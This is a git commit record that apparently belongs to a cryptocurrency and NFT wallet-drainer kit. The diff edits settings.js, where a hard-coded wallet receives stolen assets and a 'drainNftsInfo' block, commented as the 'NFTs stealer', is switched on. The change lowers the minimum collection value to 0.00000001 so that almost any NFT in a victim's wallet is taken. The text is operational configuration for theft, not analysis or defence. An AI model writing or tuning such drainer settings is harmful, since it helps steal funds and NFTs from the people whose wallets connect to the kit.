dd518019c491719c7702754b5f6ed1b6f0d9ad0f
Lopioppy <107370530+Lopioppy@users.noreply.github.com>
2022-06-14 21:01:47 +0100

    Update settings.js

--- settings.js
+++ settings.js
@@ -5,7 +5,7 @@ const receiveAddress = "14K4gAauC2tWHef5C4NxR7NKJvBWCDDTeMS1sj1GGcyu";
 
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.00000001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
 }
 
